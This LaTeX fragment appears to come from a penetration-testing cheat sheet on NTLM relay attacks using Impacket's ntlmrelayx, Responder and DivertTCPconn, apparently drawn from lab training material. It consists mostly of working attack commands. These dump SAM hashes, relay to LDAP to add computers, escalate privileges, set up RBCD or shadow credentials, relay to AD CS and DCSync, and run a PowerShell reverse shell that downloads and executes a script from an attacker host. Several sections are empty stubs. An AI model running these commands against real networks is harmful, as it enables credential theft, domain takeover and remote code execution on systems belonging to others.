\section{Tools}

\subsection{Windows: ntlmrelayx}

\href{https://github.com/The-Viper-One/RedTeam-Binaries/blob/main/ntlmrelayx.exe}{NTLMrelayx.exe} in conjonction with \href{https://github.com/Arno0x/DivertTCPconn/tree/master/compiled_binaries/Binaries_x64}{DivertTCPconn} 

\begin{verbatim}
# Configure DivertTCPconn to redirect SMB traffic to port 8445
.\divertTCPConn.exe 445 8445

# Set up NTLMRelayx
# Dump SAM
.\ntlmrelayx.exe --smb-port 8445 -t [IP] or [CIDR] -smb2support

# Execute Command
.\ntlmrelayx.exe --smb-port 8445 -t [IP] or [CIDR] -smb2support -c "ipconfig"
\end{verbatim}

Once both tools have been setup trigger LLMNR poisoning to capture a NTLMv2 request and then relay to a host that does not have SMB signing required.


\subsection{Impacket ntlmrelayx}
\label{tool:impacket:ntlmrelayx}

\href{https://www.secureauth.com/blog/we-love-relaying-credentials-a-technical-guide-to-relaying-credentials-everywhere/}{A guide to relaying credentials everywhere in 2022}


In case of poisoning with \verb+Responder+, responder smb/http servers must be turned off in config file 


relay and perform attacks

Support:
\begin{itemize}
    \item 
        One-Shot Attack (the original approach) 
    \item 
        Reuse Every Session (the SOCKS approach) \href{https://www.secureauth.com/blog/playing-with-relayed-credentials/}{detailed here}
    \item 
        Multi-relay Attacks, i.e. using just a single connection to attack several targets. This is the default for smb/http (\verb+-no-multirelay+). \href{https://www.secureauth.com/blog/what-is-old-is-new-again-the-relay-attack/}{Detaile here} but based on the principle to authenticate the user locally and force him to authenticate again when needed.
\end{itemize}

\subsubsection{Target Definitioni, multi-relay and incoming connections}

\begin{itemize}
    \item general targets (\verb+<ip>+) or \verb+<scheme>://<ip>:<port>/<path>+
    \item named target (\verb+<scheme>://<authority>/<path>+) 
\end{itemize}

where:
\begin{itemize}
    \item \verb+scheme+ (targeted protocol): \verb+ldap+, \verb+http+, \verb+smb+ (default), \verb+all+ 
    \item \verb+authority+ \verb+DOMAIN_NAME\\USERNAME@HOST:PORT+
    \item \verb+path+: only required for specific attacks such as when accessing access-restricted web endpoints
\end{itemize}

\verb+port+ port is optional and if not sepified default port of the proto is used.


\begin{itemize}
    \item single general target (\verb+-t smb://172.16.0.11+): will relay only the first NTLM authentication connection belonging to any user (from any host) to the relay target 
    \item single general target in a \verb+-tf <file>+): ll relay any number of NTLM authentication connections belonging to any user (from any host) to the relay target 
    \item single named target (\verb+-t smb://HAAS\\jubeaz@172.16.07.11+): will relay any number of NTLM authentication connections belonging to \verb+HAAS\jubeaz+ (from any host) to the relay target \verb+172.16.0.11+ over \verb+SMB+
\end{itemize}


The targets file used with the \verb+-tf+ option can contain the following:
\begin{verbatim}
# User filter for SMB only (for now)
smb://DOMAIN\User@192.168.1.101
smb://User@192.168.1.101

# Custom ports and paths can be specified
smb://target:port
http://target:port/somepath

# Domain name can be used instead of the IP address
ldaps://someserver.domain.lan
someserver.domain.lan
\end{verbatim}



\subsubsection{Socks}
launch a socks server (\verb+-socks-port <port>+ deault 1080)

command available
\begin{verbatim}
# list servers
socks

stopservers
...
\end{verbatim}

\subsubsection{Interactive}

alternative we can use the \verb+--interactive/-i+ option to launch an SMB client shell for each ntlmrelayx established authenticated session.


The SMB client shell will listen locally on a TCP port (rendered on screen), and we can reach it with tools such as \verb+nc+ (\verb+-nv 127.0.0.1 <port>+)

\subsubsection{Other usefull options}

\begin{itemize}
    \item 
        \verb+-w+ with \verb+-tf+ in order to Watch the target file for changes and update target list automatically.

    \item
        \verb+-ip+ IP address of interface to bind SMB and HTTP servers
    \item
        \verb+--keep-relaying+ keeps relaying to a target even after a successful connection on it
    \item 
        \verb+-smb2support+ SMB2 Support
    \item
        \verb+-ntlmchallenge NTLMCHALLENGE+ Specifies the NTLM server challenge used by the SMB Server (16 hex bytes long. eg:
                        1122334455667788)
    \item
        \verb+-socks-port SOCKS_PORT+ (default 1080)

\end{itemize}

\subsubsection{Relay over SMB}
By default, if the session has highly privileged access on the target machine, ntlmrelayx will try to perform a SAM dump.

\begin{itemize}
    \item command execution : \verb+<NTLMRELAYX_CMD> -c 'ping -n 1 172.16.117.30'+
    \item nishang reverseshell :
        \verb+<NTLMRELAYX_CMD> -c "powershell -c IEX(New-Object NET.WebClient).DownloadString('http://<ip>:<http_port>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <ip> -Port <port>"+

\end{itemize}

\subsubsection{Relay over MSSQL}
For any post-relay attacks targeting MSSQL, you must switch to the root 

\begin{verbatim}
$ sudo ntlmrelayx.py -t mssql://172.16.117.60 -smb2support -socks

$ echo 'mssql://172.16.117.60' > target.txt 
$ sudo ntlmrelayx.py -tf target.txt  -smb2support -socks

scheme://DOMAIN\\USER@TARGETIP


$ proxychains -q mssqlclient.py INLANEFREIGHT/nports@172.16.117.60 -windows-auth -no-pass

\end{verbatim}

\subsubsection{Relay over LDAP}

\begin{itemize}
    \item 
        Domain Enumeration
    \item 
        Computer Accounts Creation
    \item 
        Privilege Escalation via ACLs Abuse
    \item 
        Kerberos RBCD Abuse
    \item 
        Password Attacks
\end{itemize}


By default ntlmrelayx will try to dump domain information, add a new domain admin, and escalate privileges via misconfigured ACLs/DACLs attacks

\begin{verbatim}

# dump AD
$ sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --lootdir ldap_dump


# Add computer
$ sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --add-computer 'plaintext$'

# Escalate user
$ sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --escalate-user 'plaintext$' --no-dump -debug

# Escalate create rbcd (SQL01$ delegate to plaintext$) 
sudo ntlmrelayx.py -t ldaps://INLANEFREIGHT\\'SQL01$'@172.16.117.3 --delegate-access --escalate-user 'plaintext$' --no-smb-server --no-dump

# Shadow credentials (generate a pfx to use with gettgtpkinit.py)
ntlmrelayx.py -t ldap://INLANEFREIGHT.LOCAL\\<relayed_account>@172.16.117.3 \
    --shadow-credentials --shadow-target <target_account> \
    --no-da --no-dump --no-acl
\end{verbatim}

\subsubsection{Relay over HTTP}
allow to bypass \verb+WWW-Authenticate: NTLM+



\subsubsection{Relay over imap}

\subsubsection{Relay over RPC}

\begin{itemize}
    \item \href{https://blog.compass-security.com/2020/05/relaying-ntlm-authentication-over-rpc/}{Relaying NTLM authentication over RPC}
\end{itemize}


\subsubsection{Relay over ALL}
\begin{verbatim}

$ sed -i '4,18s/= On/= Off/g' /usr/share/responder/Responder.conf
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -socks

\end{verbatim}

\subsubsection{Relay misc}

relay do dcsync:
\begin{verbatim}
impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support
\end{verbatim}

relay to adcs:
\begin{verbatim}
ntlmrelayx -t http://172.16.18.15/certsrv/default.asp -smb2support \
    --template DomainController \
    --adcs
\end{verbatim}
to find the webenrollement url (to test): 
\begin{verbatim}
(Get-CASite -Name "MyCA").WebEnrollmentURI
\end{verbatim}
use \href{https://github.com/zer1t0/certi}{certi} to find the URL of the CA

\begin{verbatim}
Get-ADObject -Identity "CN=MyCA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com" -Properties caWebEnroll | Select-Object caWebEnroll
\end{verbatim}


\subsection{Multirelay}



\subsection{Inveigh-Relay}
